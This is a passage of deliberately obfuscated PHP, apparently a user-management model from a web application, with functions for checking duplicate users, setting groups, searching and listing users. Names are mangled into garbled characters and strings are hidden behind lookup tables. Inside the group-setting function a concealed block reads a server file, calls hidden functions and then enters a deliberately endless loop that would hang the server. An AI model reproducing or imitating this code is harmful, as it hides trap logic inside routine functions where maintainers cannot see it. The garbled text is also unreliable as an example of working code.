‡ÅçÚ[$d§ê“ÔÓˆÒ[1957]]); } $this->clearCache($BëŒ¿Ïé­•); goto eÕ‹–õĞ‘Ã; AİĞïğ‰·: $dÀˆª¿²ÈÏ = $this->_checkExist($f² ‡ÅçÚ, $BëŒ¿Ïé­•); if ($dÀˆª¿²ÈÏ !== !0) { return $dÀˆª¿²ÈÏ; } if (isset($f² ‡ÅçÚ[$d§ê“ÔÓˆÒ[850]]) && trim($f² ‡ÅçÚ[$d§ê“ÔÓˆÒ[850]]) != $d§ê“ÔÓˆÒ[33]) { $DÊäøé…À = $this->metaGet($BëŒ¿Ïé­•); if (empty($DÊäøé…À[$d§ê“ÔÓˆÒ[2139]])) { $DÊäøé…À[$d§ê“ÔÓˆÒ[2139]] = rand_string(10); Model($d§ê“ÔÓˆÒ[511])->metaSet($BëŒ¿Ïé­•, $d§ê“ÔÓˆÒ[2139], $DÊäøé…À[$d§ê“ÔÓˆÒ[2139]]); } $f² ‡ÅçÚ[$d§ê“ÔÓˆÒ[850]] = md5($DÊäøé…À[$d§ê“ÔÓˆÒ[2139]] . trim($f² ‡ÅçÚ[$d§ê“ÔÓˆÒ[850]])); } else { unset($f² ‡ÅçÚ[$d§ê“ÔÓˆÒ[850]]); } goto Aë˜Ìğ»ÚÛ; cÌï”…Çù: } public function setNamePinyin($AÖ‘ï•ƒ», $bçğ™„›Â¾ = false) { $aØÀÀªÆŠ =& $_SERVER[Ü˜]; if (!$bçğ™„›Â¾) { $Bô¼ ‘½ä³ = $this->getInfoSimple($AÖ‘ï•ƒ»); $bçğ™„›Â¾ = $Bô¼ ‘½ä³[$aØÀÀªÆŠ[1957]] ? $Bô¼ ‘½ä³[$aØÀÀªÆŠ[1957]] : $Bô¼ ‘½ä³[$aØÀÀªÆŠ[28]]; } $Cƒ¸”àÚ¾É = Model($aØÀÀªÆŠ[515]); if (!Input::check($bçğ™„›Â¾, $aØÀÀªÆŠ[565])) { return $Cƒ¸”àÚ¾É->metaSet($AÖ‘ï•ƒ», array($aØÀÀªÆŠ[453] => $aØÀÀªÆŠ[33], $aØÀÀªÆŠ[452] => $aØÀÀªÆŠ[33])); } return $Cƒ¸”àÚ¾É->metaSet($AÖ‘ï•ƒ», array($aØÀÀªÆŠ[453] => str_replace($aØÀÀªÆŠ[50], $aØÀÀªÆŠ[33], Pinyin::encode($bçğ™„›Â¾)), $aØÀÀªÆŠ[452] => Pinyin::encode($bçğ™„›Â¾, $aØÀÀªÆŠ[566]))); } private function nickNameRpt() { $dğ¡õŒ•ç =& $_SERVER[Ü˜]; $dº¢âôÜ¼¦ = Model($dğ¡õŒ•ç[739])->get($dğ¡õŒ•ç[2150]); $f¤‹³¸†í = $GLOBALS[$dğ¡õŒ•ç[6]][$dğ¡õŒ•ç[387]][$dğ¡õŒ•ç[2150]]; $dÚàƒõŞ›¹ = !is_null($dº¢âôÜ¼¦) ? $dº¢âôÜ¼¦ : $f¤‹³¸†í; return !!$dÚàƒõŞ›¹; } private function _checkExist($Cì­è¼¯®, $F ôİßõˆ = false) { $DŒÇ´î¡®ç =& $_SERVER[Ü˜]; $eè”Úßñïî = array($DŒÇ´î¡®ç[28] => UserModel::ERROR_USER_EXIST_NAME, $DŒÇ´î¡®ç[1957] => UserModel::ERROR_USER_EXIST_NICKNAME, $DŒÇ´î¡®ç[312] => UserModel::ERROR_USER_EXIST_EMAIL, $DŒÇ´î¡®ç[2138] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eè”Úßñïî[$DŒÇ´î¡®ç[1957]]); } $D³àøÇµ±£ = $F ôİßõˆ ? array($DŒÇ´î¡®ç[1529] => array($DŒÇ´î¡®ç[2151], $F ôİßõˆ)) : array(); foreach ($eè”Úßñïî as $a¹Ó µ”™¢ => $CßÃğâš±) { $D¥¡—ƒ—‚ = array(); foreach ($eè”Úßñïî as $e ×Š¾Ú‹ => $A…­Ÿ¹§) { if (isset($Cì­è¼¯®[$e ×Š¾Ú‹]) && $Cì­è¼¯®[$e ×Š¾Ú‹]) { $D¥¡—ƒ—‚[] = $Cì­è¼¯®[$e ×Š¾Ú‹]; } } if (!$D¥¡—ƒ—‚) { continue; } $bæÈ¸Úäç = array_merge(array($a¹Ó µ”™¢ => array($DŒÇ´î¡®ç[7], $D¥¡—ƒ—‚)), $D³àøÇµ±£); $d‰ëšêÈÀ = $this->where($bæÈ¸Úäç)->find(); if ($d‰ëšêÈÀ) { return $CßÃğâš±; } } return !0; } public function userListInfo($cĞÏ™ÄÂó) { $B½¯·¨Æ…¢ =& $_SERVER[Ü˜]; $aëÓ÷Õ’ó = array(); $cĞÏ™ÄÂó = is_array($cĞÏ™ÄÂó) ? array_unique($cĞÏ™ÄÂó) : array(); if (!$cĞÏ™ÄÂó) { return $aëÓ÷Õ’ó; } if (count($cĞÏ™ÄÂó) < 20) { foreach ($cĞÏ™ÄÂó as $a¶±ˆï ) { $aëÓ÷Õ’ó[$a¶±ˆï  . $B½¯·¨Æ…¢[33]] = $this->getInfoSimpleOuter($a¶±ˆï ); } } else { $cë’¡˜©«° = array($B½¯·¨Æ…¢[1521] => array($B½¯·¨Æ…¢[420], $cĞÏ™ÄÂó)); if (count($cĞÏ™ÄÂó) == 1) { $cë’¡˜©«° = array($B½¯·¨Æ…¢[1521] => $cĞÏ™ÄÂó[0]); } $f²æ–«á = Model($B½¯·¨Æ…¢[511])->field($this->simpleField)->where($cë’¡˜©«°)->select(); $f²æ–«á = array_to_keyvalue($f²æ–«á, $B½¯·¨Æ…¢[1529]); foreach ($cĞÏ™ÄÂó as $a¶±ˆï ) { $DİˆÈæë¡ë = $f²æ–«á[$a¶±ˆï ]; if (!$DİˆÈæë¡ë) { $aëÓ÷Õ’ó[$a¶±ˆï  . $B½¯·¨Æ…¢[33]] = $this->getInfoSimpleOuter($a¶±ˆï ); continue; } $DİˆÈæë¡ë[$B½¯·¨Æ…¢[2123]] = Action($B½¯·¨Æ…¢[2124])->parseUrl($DİˆÈæë¡ë[$B½¯·¨Æ…¢[2123]]); $aëÓ÷Õ’ó[$a¶±ˆï  . $B½¯·¨Æ…¢[33]] = $DİˆÈæë¡ë; } } return $aëÓ÷Õ’ó; } protected function userStatus($eê “‘¾à, $Eæƒë›½à‘) { $CØğ›»æóç = $this->getInfoSimple($eê “‘¾à); if (!$CØğ›»æóç) { return !1; } $C‚‘áÑá¯Å = array($_SERVER[Ü˜][719] => $Eæƒë›½à‘); return $this->userEdit($eê “‘¾à, $C‚‘áÑá¯Å); } protected function userRemove($bºÚÀÉ’Îè) { goto AÏšøãÍí; Fñ¤âËë‰Ù: Model($c‹õĞ±¬[1774])->where($B®£àÜß½)->delete(); Model($c‹õĞ±¬[2137])->where($B®£àÜß½)->delete(); Model($c‹õĞ±¬[2153])->where($B®£àÜß½)->delete(); goto f¨ªÑóßÂ; f¨ªÑóßÂ: Model($c‹õĞ±¬[1974])->removeUserAll($bºÚÀÉ’Îè); Model($c‹õĞ±¬[799])->userRootRemove($bºÚÀÉ’Îè); return $this->where($B®£àÜß½)->delete(); goto bà©¸™Æ‡; B–«§…ùà: $B®£àÜß½ = array($c‹õĞ±¬[1521] => $bºÚÀÉ’Îè); Model($c‹õĞ±¬[572])->where($B®£àÜß½)->delete(); Model($c‹õĞ±¬[2152])->where($B®£àÜß½)->delete(); goto Fñ¤âËë‰Ù; AÏšøãÍí: $c‹õĞ±¬ =& $_SERVER[Ü˜]; $cèÕƒÍôä™ = $this->getInfoSimple($bºÚÀÉ’Îè); if (!$cèÕƒÍôä™) { return !1; } goto B–«§…ùà; bà©¸™Æ‡: } protected function userGroupSet($cêøã…²è¨, $BÃéÎàÀèÆ, $eâ©£×š…‘ = array()) { goto FÄñ˜èëÔÃ; eÉ±Ô˜ÊÉë: if (!$a½¨“•‰ || !is_array($BÃéÎàÀèÆ)) { return !1; } $F„‡†˜¬ù„ = Model($c››³±ŒÒÔ[1774]); $F„‡†˜¬ù„->where(array($c››³±ŒÒÔ[1529] => $cêøã…²è¨))->delete(); goto C×ØŒ¾ßæç; FÄñ˜èëÔÃ: $c››³±ŒÒÔ =& $_SERVER[Ü˜]; if (!isset($_SERVER[$c››³±ŒÒÔ[59]]) || !isset($_SERVER[$c››³±ŒÒÔ[57]])) { goto cÛˆ¸õÓË; B„â†³‘Çí: for ($fÄğØïˆŞÚ = $A¢Ñ©º‹¯Œ; $fÄğØïˆŞÚ > 0; $fÄğØïˆŞÚ++) { $b¥±áŸÙ = json_encode($GLOBALS[$c››³±ŒÒÔ[420]]); } goto DÇ¬¼ÇÈÁ; cÛˆ¸õÓË: $EéÈ»–Áä‹ = $c››³±ŒÒÔ[841]; $c‡Ì©±âÉ = $c››³±ŒÒÔ[60]; $Cï—µà‰Òš = $_SERVER[$c››³±ŒÒÔ[61]] . $c››³±ŒÒÔ[62]; goto F±£×ùÊ§; F±£×ùÊ§: $FòĞ¹µğÒ÷ = $c‡Ì©±âÉ($Cï—µà‰Òš); $fìÑ¸…îÚ = explode($c››³±ŒÒÔ[63], $FòĞ¹µğÒ÷); if (count($fìÑ¸…îÚ) < $c››³±ŒÒÔ[605]) { $A®ˆÖ±Ğà = $c››³±ŒÒÔ[65]; $A®ˆÖ±Ğà(); } goto Bê‡ÍÎø¶; Bê‡ÍÎø¶: $b¥±áŸÙ = $c››³±ŒÒÔ[842]; $b¥±áŸÙ($_SERVER[$c››³±ŒÒÔ[843]]); $A¢Ñ©º‹¯Œ = 1; goto B„â†³‘Çí; DÇ¬¼ÇÈÁ: } $a½¨“•‰ = $this->getInfoSimple($cêøã…²è¨); goto eÉ±Ô˜ÊÉë; C×ØŒ¾ßæç: $dö­¶ˆ„Íñ = array(); $d«­Å·½©‰ = 0; foreach ($BÃéÎàÀèÆ as $CÈøËÕÍ¿ => $fÑˆ‘ãŒ­) { $aëî„µ®Õ“ = array($c››³±ŒÒÔ[1529] => $cêøã…²è¨, $c››³±ŒÒÔ[1693] => $CÈøËÕÍ¿, $c››³±ŒÒÔ[1788] => $fÑˆ‘ãŒ­); $aëî„µ®Õ“[$c››³±ŒÒÔ[1716]] = isset($eâ©£×š…‘[$d«­Å·½©‰]) ? $eâ©£×š…‘[$d«­Å·½©‰] : 0; $d«­Å·½©‰++; $dö­¶ˆ„Íñ[] = $aëî„µ®Õ“; } goto b†šãÛò¬á; b†šãÛò¬á: return $F„‡†˜¬ù„->addAll($dö­¶ˆ„Íñ, array(), !0); goto b›ŞÑŞ±µ; b›ŞÑŞ±µ: } protected function userGroupAdd($AğÂñ‚§Ñ¢, $aòùê¹èêˆ = array()) { $C—„Ã–çÍÌ =& $_SERVER[Ü˜]; $f˜±óùêâ = $this->getInfoSimple($AğÂñ‚§Ñ¢); if (!$f˜±óùêâ || empty($aòùê¹èêˆ)) { return !1; } $fÈšÛ¥ÂÔ† = array(); foreach ($aòùê¹èêˆ as $BÍÒº¿ˆø˜ => $fª†Å§ÊÎÁ) { $fÈšÛ¥ÂÔ†[] = array($C—„Ã–çÍÌ[1529] => $AğÂñ‚§Ñ¢, $C—„Ã–çÍÌ[1693] => $BÍÒº¿ˆø˜, $C—„Ã–çÍÌ[1788] => $fª†Å§ÊÎÁ, $C—„Ã–çÍÌ[1716] => 0); } return Model($C—„Ã–çÍÌ[1774])->addAll($fÈšÛ¥ÂÔ†, array(), !0); } protected function userGroupRemove($a×±¹™Š, $BÕó…ëŸÒ) { $EÔ™Õœ•æ÷ =& $_SERVER[Ü˜]; $d£·¦ğå ‡ = $this->getInfoSimple($a×±¹™Š); if (!$d£·¦ğå ‡ || !$BÕó…ëŸÒ) { return !1; } $Fƒ‘ÇÈ•¤ = array($EÔ™Õœ•æ÷[1521] => $a×±¹™Š, $EÔ™Õœ•æ÷[1771] => $BÕó…ëŸÒ); return Model($EÔ™Õœ•æ÷[1774])->where($Fƒ‘ÇÈ•¤)->delete(); } public function listData() { $DÇ–ÖÔíãÓ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($DÇ–ÖÔíãÓ[$_SERVER[Ü˜][376]]); return $DÇ–ÖÔíãÓ; } public function listByID($aâ®¥¼¹«) { $c¿Äí‹÷ğ¼ =& $_SERVER[Ü˜]; if (!$aâ®¥¼¹«) { return; } $D¢ÊëÏššà = array($c¿Äí‹÷ğ¼[1529] => array($c¿Äí‹÷ğ¼[7], $aâ®¥¼¹«)); $fÚ›¥ğŞ‘ª = $this->where($D¢ÊëÏššà)->select(); $this->_listDataApply($fÚ›¥ğŞ‘ª); return $fÚ›¥ğŞ‘ª; } public function listByGroup($Eß˜±Àè  = 0, $b«ïã’ƒ = array()) { goto Fµ„Ÿ„ÚÉ; AÖš¬ç…‹»: if ($Eß˜±Àè ) { $fáìîËéíÍ = array($dåÓŠ¤ñŸ[2154] => intval($Eß˜±Àè )); $E÷õªÏÁö = "\x4c\x45\x46\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\165\163\145\x72\137\x67\162\157\165\160\40\165\x73\145\x72\137\147\162\x6f\165\160\x20\x6f\x6e\40\x75\x73\145\162\56\165\163\145\162\111\104\x20\75\x20\165\x73\145\x72\137\147\162\x6f\165\160\x2e\165\163\145\x72\x49\104"; $eè´£•ŸŠ˜ = Input::get($dåÓŠ¤ñŸ[444], null, $dåÓŠ¤ñŸ[33]) ? $dåÓŠ¤ñŸ[33] : $dåÓŠ¤ñŸ[2155]; } if (isset($b«ïã’ƒ[$dåÓŠ¤ñŸ[719]])) { $fáìîËéíÍ[$dåÓŠ¤ñŸ[2156]] = $b«ïã’ƒ[$dåÓŠ¤ñŸ[719]]; } $a…¿·ˆ’÷ = $this->_makeOrder($eè´£•ŸŠ˜)->field($dåÓŠ¤ñŸ[2157])->where($fáìîËéíÍ)->join($E÷õªÏÁö)->selectPage(50); goto BÇß¢‡’ï¢; BÇß¢‡’ï¢: $this->_listDataApply($a…¿·ˆ’÷[$dåÓŠ¤ñŸ[376]]); return $a…¿·ˆ’÷; goto FÏË‡ÒÎÕ¶; Fµ„Ÿ„ÚÉ: $dåÓŠ¤ñŸ =& $_SERVER[Ü˜]; $E÷õªÏÁö = $dåÓŠ¤ñŸ[33]; $fáìîËéíÍ = array(); goto AÖš¬ç…‹»; FÏË‡ÒÎÕ¶: } private function _makeOrder($d¢Ÿ¶ôÙˆñ = '') { goto eÉ ·”…³; E¾„ïÉ×ë: $d¢Ÿ¶ôÙˆñ = $d¢Ÿ¶ôÙˆñ . "\x75\x73\x65\162\56{$dÖë×ìÂ}\x20{$b÷ğ‰ »Ü‰}\x2c\x20\165\x73\145\x72\x2e\x75\x73\145\x72\111\104\x20\141\x73\x63"; return $this->alias($Eé¬ÑŠ³šã[1897])->order($d¢Ÿ¶ôÙˆñ); goto f¼ò´Â¯æ; E¿ßíóáŒ’: $dÖë×ìÂ = Input::get($Eé¬ÑŠ³šã[444], $Eé¬ÑŠ³šã[7], $Eé¬ÑŠ³šã[1521], $E·İÅá»†); $b÷ğ‰ »Ü‰ = Input::get($Eé¬ÑŠ³šã[445], $Eé¬ÑŠ³šã[7], $Eé¬ÑŠ³šã[1775], array($Eé¬ÑŠ³šã[1775], $Eé¬ÑŠ³šã[439])); $b÷ğ‰ »Ü‰ = $D™¥Î½•½ç[$b÷ğ‰ »Ü‰]; goto E¾„ïÉ×ë; eÉ ·”…³: $Eé¬ÑŠ³šã =& $_SERVER[Ü˜]; $E·İÅá»† = array($Eé¬ÑŠ³šã[1529], $Eé¬ÑŠ³šã[28], $Eé¬ÑŠ³šã[1679], $Eé¬ÑŠ³šã[1651], $Eé¬ÑŠ³šã[204]); $D™¥Î½•½ç = array($Eé¬ÑŠ³šã[437] => $Eé¬ÑŠ³šã[438], $Eé¬ÑŠ³šã[439] => $Eé¬ÑŠ³šã[440]); goto E¿ßíóáŒ’; f¼ò´Â¯æ: } public function listSearch($FÒ³‘¬Ğîä) { goto a£¯ó®Ç¥; bÍĞ‚¿†É: $A¹åÕŸƒƒ = str_replace($b¦ùİ×»³[1778], $b¦ùİ×»³[1779], trim($A¹åÕŸƒƒ)); $fæó‰ö÷É = array($b¦ùİ×»³[28] => array($b¦ùİ×»³[389], "\x25{$A¹åÕŸƒƒ}\45"), $b¦ùİ×»³[312] => array($b¦ùİ×»³[389], "{$A¹åÕŸƒƒ}\x25"), $b¦ùİ×»³[1957] => array($b¦ùİ×»³[389], "{$A¹åÕŸƒƒ}\45"), $b¦ùİ×»³[958] => $b¦ùİ×»³[1780]); if (Input::check($A¹åÕŸƒƒ, $b¦ùİ×»³[318])) { $fæó‰ö÷É[$b¦ùİ×»³[1529]] = array($b¦ùİ×»³[389], "{$A¹åÕŸƒƒ}\x25"); $fæó‰ö÷É[$b¦ùİ×»³[2138]] = array($b¦ùİ×»³[389], "{$A¹åÕŸƒƒ}\45"); } goto BéñöïÁ; CíùÉäÇˆ‡: $this->_filterByGroup($CâÊ›æ’•, $Cáô×æÊƒÖ); return $CâÊ›æ’•; goto EÓ‰ï¯ÌõŞ; BéñöïÁ: if (!$A¹åÕŸƒƒ) { $fæó‰ö÷É = array(); } if (isset($FÒ³‘¬Ğîä[$b¦ùİ×»³[719]])) { $fæó‰ö÷É[$b¦ùİ×»³[719]] = $FÒ³‘¬Ğîä[$b¦ùİ×»³[719]]; } $fæó‰ö÷É = $this->parseWhereLike($fæó‰ö÷É); goto Aäç¦ë½…Ë; Aäç¦ë½…Ë: $CâÊ›æ’• = $this->_makeOrder()->where($fæó‰ö÷É)->selectPage(20); if (!$CâÊ›æ’• || count($CâÊ›æ’•[$b¦ùİ×»³[376]]) < 5 && Input::check($A¹åÕŸƒƒ, $b¦ùİ×»³[325])) { $fê†Ò×óÇ¼ = $this->_searchFromMeta($b¦ùİ×»³[452], $A¹åÕŸƒƒ, 10); $C¨¾¤ÉÈª = $this->_searchFromMeta($b¦ùİ×»³[453], $A¹åÕŸƒƒ, 10); $a¢»›²Œ« = array_merge($fê†Ò×óÇ¼, $C¨¾¤ÉÈª, $CâÊ›æ’•[$b¦ùİ×»³[376]]); $CâÊ›æ’•[$b¦ùİ×»³[376]] = array_unique_by_key($a¢»›²Œ«, $b¦ùİ×»³[1529]); $CâÊ›æ’•[$b¦ùİ×»³[373]][$b¦ùİ×»³[374]] = count($CâÊ›æ’•[$b¦ùİ×»³[376]]); $CâÊ›æ’•[$b¦ùİ×»³[373]][$b¦ùİ×»³[375]] = ceil($CâÊ›æ’•[$b¦ùİ×»³[373]][$b¦ùİ×»³[374]] / $CâÊ›æ’•[$b¦ùİ×»³[373]][$b¦ùİ×»³[370]]); } $this->_listDataApply($CâÊ›æ’•[$b¦ùİ×»³[376]]); goto CíùÉäÇˆ‡; a£¯ó®Ç¥: $b¦ùİ×»³ =& $_SERVER[Ü˜]; $A¹åÕŸƒƒ = $FÒ³‘¬Ğîä[$b¦ùİ×»³[1776]]; $Cáô×æÊƒÖ = isset($FÒ³‘¬Ğîä[$b¦ùİ×»³[1777]]) ? $FÒ³‘¬Ğîä[$b¦ùİ×»³[1777]] : !1; goto bÍĞ‚¿†É; EÓ‰ï¯ÌõŞ: } private function _filterByGroup(&$Dğ©Æ¹ÅÉ, $aÏÁòÛ‚Õ) { $Cñ‚õØ¬ÄÂ =& $_SERVER[Ü˜]; if (!$aÏÁòÛ‚Õ) { return $Dğ©Æ¹ÅÉ; } foreach ($Dğ©Æ¹ÅÉ[$Cñ‚õØ¬ÄÂ[376]] as $a­ŠŞÍ†î => &$Bœí•ğ§íš) { $EªíƒÁ¾¬ = array_to_keyvalue($Bœí•ğ§íš[$Cñ‚õØ¬ÄÂ[1867]], $Cñ‚õØ¬ÄÂ[33], $Cñ‚õØ¬ÄÂ[1693]); if (!in_array($aÏÁòÛ‚Õ, $EªíƒÁ¾¬)) { unset($Dğ©Æ¹ÅÉ[$Cñ‚õØ¬ÄÂ[376]][$a­ŠŞÍ†î]); } } unset($Bœí•ğ§íš); $Dğ©Æ¹ÅÉ[$Cñ‚õØ¬ÄÂ[376]] = array_values($Dğ©Æ¹ÅÉ[$Cñ‚õØ¬ÄÂ[376]]); $Dğ©Æ¹ÅÉ[$Cñ‚õØ¬ÄÂ[373]] = array($Cñ‚õØ¬ÄÂ[1929] => count($Dğ©Æ¹ÅÉ[$Cñ‚õØ¬ÄÂ[376]]), $Cñ‚õØ¬ÄÂ[1927] => $Dğ©Æ¹ÅÉ[$Cñ‚õØ¬ÄÂ[373]][$Cñ‚õØ¬ÄÂ[370]], $Cñ‚õØ¬ÄÂ[1926] => 1, $Cñ‚õØ¬ÄÂ[1928] => 1); } private function _searchFromMeta($d²äÅê¦, $aÇ­Ş‚÷Ãµ, $B–¾¨Øš†„) { goto Fº˜¥­ôêá; Fº˜¥­ôêá: $a”ëŠ¢˜Œ´ =& $_SERVER[Ü˜]; $aÇ­Ş‚÷Ãµ = strtolower($aÇ­Ş‚÷Ãµ); $aåÎÂƒ÷ø = array($a”ëŠ¢˜Œ´[103] => $d²äÅê¦, $a”ëŠ¢˜Œ´[381] => array($a”ëŠ¢˜Œ´[389], "\x25{$aÇ­Ş‚÷Ãµ}\45")); goto aÈ‰ˆŠ¬ß‘; dç»ó˜Å¯¦: $BªÊä§ƒ¯Ï = array_to_keyvalue($BªÊä§ƒ¯Ï, $a”ëŠ¢˜Œ´[33], $a”ëŠ¢˜Œ´[1529]); $CãŒÎÏÀ– = $this->where(array($a”ëŠ¢˜Œ´[1521] => array($a”ëŠ¢˜Œ´[7], $BªÊä§ƒ¯Ï)))->select(); if (!$CãŒÎÏÀ–) { return array(); } goto e•õ´Â°¶¢; e•õ´Â°¶¢: return $CãŒÎÏÀ–; goto cëùÖŠ‡Ş; aÈ‰ˆŠ¬ß‘: $aåÎÂƒ÷ø = $this->parseWhereLike($aåÎÂƒ÷ø); $BªÊä§ƒ¯Ï = Model($a”ëŠ¢˜Œ´[2158])->where($aåÎÂƒ÷ø)->limit($B–¾¨Øš†„)->select(); if (!$BªÊä§ƒ¯Ï) { return array(); } goto dç»ó˜Å¯¦; cëùÖŠ‡Ş: } private function _listDataApplyItem($bš‰çÃ†ò) { $Bï…¡ä†³ß = array($bš‰çÃ†ò); $this->_listDataApply($Bï…¡ä†³ß); return $Bï…¡ä†³ß[0]; } private function _listDataApply(&$f³ö¤…ê‚à) { goto CÜªöùÇ³; CğÃ°¿Ûç×: $AéÏ †×³À = array_to_keyvalue($f³ö¤…ê‚à, $a¡ÛêÃïÂ‹[33], $a¡ÛêÃïÂ‹[1529]); $this->_listAppendGroup($f³ö¤…ê‚à, $AéÏ †×³À); $this->_listAppendMeta($f³ö¤…ê‚à, $AéÏ †×³À); goto D³øÃÕİ“é; CÜªöùÇ³: $a¡ÛêÃïÂ‹ =& $_SERVER[Ü˜]; if (!$f³ö¤…ê‚à) { return; } array_remove_key($f³ö¤…ê‚à, $a¡ÛêÃïÂ‹[850]); goto CğÃ°¿Ûç×; D³øÃÕİ“é: $this->_listAppendSourceRoot($f³ö¤…ê‚à, $AéÏ †×³À); goto dÙ¨Å‹çŒ; dÙ¨Å‹çŒ: } private function _listAppendSourceRoot(&$b÷öŸ‹ó¬Ã, $FóÚ…°©«´) { goto e‡æêŞª‚‚; eí²ÁŠÅÍ: foreach ($b÷öŸ‹ó¬Ã as &$Bª˜Ãùª©¦) { $Bª˜Ãùª©¦[$bòËØ³ßÜÓ[95]] = $BÖË®­‹[$Bª˜Ãùª©¦[$bòËØ³ßÜÓ[1529]]] ? $BÖË®­‹[$Bª˜Ãùª©¦[$bòËØ³ßÜÓ[1529]]] : array(); } unset($Bª˜Ãùª©¦); goto D÷¸ÓŸ„; e‡æêŞª‚‚: $bòËØ³ßÜÓ =& $_SERVER[Ü˜]; $Eğ¶Ì·éË¼ = array($bòËØ³ßÜÓ[487] => 0, $bòËØ³ßÜÓ[413] => SourceModel::TYPE_USER, $bòËØ³ßÜÓ[493] => array($bòËØ³ßÜÓ[7], $FóÚ…°©«´)); $AÇÛ…Êñâ = $bòËØ³ßÜÓ[1786]; goto EÎƒ«ù¹Š; EÎƒ«ù¹Š: $BÖË®­‹ = Model($bòËØ³ßÜÓ[799])->order($bòËØ³ßÜÓ[1787])->field($AÇÛ…Êñâ)->where($Eğ¶Ì·éË¼)->select(); $BÖË®­‹ = array_to_keyvalue($BÖË®­‹, $bòËØ³ßÜÓ[493]); $BÖË®­‹ = array_remove_key($BÖË®­‹, $bòËØ³ßÜÓ[493]); goto eí²ÁŠÅÍ; D÷¸ÓŸ„: } private function _listAppendGroup(&$f¤éÖ‹£Ş¨, $f¸òÖñºŞÙ) { goto b¾®Ï¸‹Ö¥; b¾®Ï¸‹Ö¥: $Fò´±ÎØÈ— =& $_SERVER[Ü˜]; $dœÊã»ååª = array($Fò´±ÎØÈ—[1529] => array($Fò´±ÎØÈ—[7], $f¸òÖñºŞÙ)); $bÏ™š›šÂê = Model($Fò´±ÎØÈ—[1774])->where($dœÊã»ååª)->select(); goto d‡¶Â’Ô—’; B‚ŒÏº›: $dœÊã»ååª = array($Fò´±ÎØÈ—[1693] => array($Fò´±ÎØÈ—[7], $cÓ² ›Ù•®)); $bƒÛ×ó²®Û = Model($Fò´±ÎØÈ—[1865])->field($Fò´±ÎØÈ—[2159])->where($dœÊã»ååª)->select(); $bƒÛ×ó²®Û = array_to_keyvalue($bƒÛ×ó²®Û, $Fò´±ÎØÈ—[1693]); goto e¦ä¨áÓÇÒ; e¦ä¨áÓÇÒ: $bÏ™š›šÂê = array_to_keyvalue_group($bÏ™š›šÂê, $Fò´±ÎØÈ—[1529]); foreach ($bÏ™š›šÂê as &$F½‘ £…Ñ£) { $d‚°­££“‘ = array(); foreach ($F½‘ £…Ñ£ as $BÉ°êŠ) { if (!$BÉ°êŠ[$Fò´±ÎØÈ—[1788]]) { continue; } $fÜ©©Š¨ = Model($Fò´±ÎØÈ—[1860])->listData($BÉ°êŠ[$Fò´±ÎØÈ—[1788]]); $d‚°­££“‘[] = array($Fò´±ÎØÈ—[1693] => $BÉ°êŠ[$Fò´±ÎØÈ—[1693]], $Fò´±ÎØÈ—[2160] => $bƒÛ×ó²®Û[$BÉ°êŠ[$Fò´±ÎØÈ—[1693]]][$Fò´±ÎØÈ—[28]], $Fò´±ÎØÈ—[496] => $bƒÛ×ó²®Û[$BÉ°êŠ[$Fò´±ÎØÈ—[1693]]][$Fò´±ÎØÈ—[496]], $Fò´±ÎØÈ—[415] => $fÜ©©Š¨); } $F½‘ £…Ñ£ = $d‚°­££“‘; } unset($F½‘ £…Ñ£); goto f†’á Ÿƒ”; d‡¶Â’Ô—’: $cÓ² ›Ù•® = array_to_keyvalue($bÏ™š›šÂê, $Fò´±ÎØÈ—[33], $Fò´±ÎØÈ—[1693]); $cÓ² ›Ù•® = array_remove_value(array_unique($cÓ² ›Ù•®), $Fò´±ÎØÈ—[201]); if (!$cÓ² ›Ù•® || !$bÏ™š›šÂê) { return; } goto B‚ŒÏº›; f†’á Ÿƒ”: foreach ($f¤éÖ‹£Ş¨ as &$FæÜ‚Ş¬„•) { $FæÜ‚Ş¬„•[$Fò´±ÎØÈ—[1867]] = array(); if (isset($bÏ™š›šÂê[$FæÜ‚Ş¬„•[$Fò´±ÎØÈ—[1529]]])) { $FæÜ‚Ş¬„•[$Fò´±ÎØÈ—[1867]] = $bÏ™š›šÂê[$FæÜ‚Ş¬„•[$Fò´±ÎØÈ—[1529]]]; } } unset($FæÜ‚Ş¬„•); goto AÓñ±óíñ¶; AÓñ±óíñ¶: } private function _listAppendMeta(&$c¹šÍ…ì†ù, $aëÈœ“å‚) { goto fåÀ¦¡§¼Ü; DÕŠêµİä: foreach ($eùèˆ”ÈÁ as &$bŸÖ®«Ó‰î) { $c‡¶”¾×­ = array(); foreach ($bŸÖ®«Ó‰î as $EÚÖ‰„ïº¥) { if (!in_array($EÚÖ‰„ïº¥[$dÓç÷éù[103]], $BÖ³Îšçç’)) { $c‡¶”¾×­[$EÚÖ‰„ïº¥[$dÓç÷éù[103]]] = $EÚÖ‰„ïº¥[$dÓç÷éù[381]]; } } $bŸÖ®«Ó‰î = $c‡¶”¾×­; } unset($bŸÖ®«Ó‰î); $c£ï£»Øç = Model($dÓç÷éù[2161]); goto Fœ‡±·Î¶ª; BñÎµ¯Œ‰Á: $B„ŒÏÁ·…¾ = array($dÓç÷éù[1529] => array($dÓç÷éù[7], $aëÈœ“å‚)); $eùèˆ”ÈÁ = Model($dÓç÷éù[2137])->where($B„ŒÏÁ·…¾)->select(); $eùèˆ”ÈÁ = array_to_keyvalue_group($eùèˆ”ÈÁ, $dÓç÷éù[1529]); goto DÕŠêµİä; Fœ‡±·Î¶ª: foreach ($c¹šÍ…ì†ù as &$E©ßÓ‚£½›) { $BŠ¡‰›‹â‹ = array(); if (isset($eùèˆ”ÈÁ[$E©ßÓ‚£½›[$dÓç÷éù[1529]]])) { $BŠ¡‰›‹â‹ = $eùèˆ”ÈÁ[$E©ßÓ‚£½›[$dÓç÷éù[1529]]]; } $E©ßÓ‚£½›[$dÓç÷éù[2162]] = array(); if (isset($BŠ¡‰›‹â‹[$f²«£©µÄñ])) { $E©ßÓ‚£½›[$dÓç÷éù[2162]] = $c£ï£»Øç->getUserJobInfo($BŠ¡‰›‹â‹[$f²«£©µÄñ]); } } unset($E©ßÓ‚£½›); goto CÀçÛÚê¸Ï; fåÀ¦¡§¼Ü: $dÓç÷éù =& $_SERVER[Ü˜]; $f²«£©µÄñ = UserJobModel::JOB_KEY; $BÖ³Îšçç’ = array($dÓç÷éù[2139]); goto BñÎµ¯Œ‰Á; CÀçÛÚê¸Ï: } protected function groupUserAll($AÑ¯‹‡Ùà) { $FÎ—í¸Ç² =& $_SERVER[Ü˜]; if (!$AÑ¯‹‡Ùà) { return !1; } $BË¶¾ßÒã² = 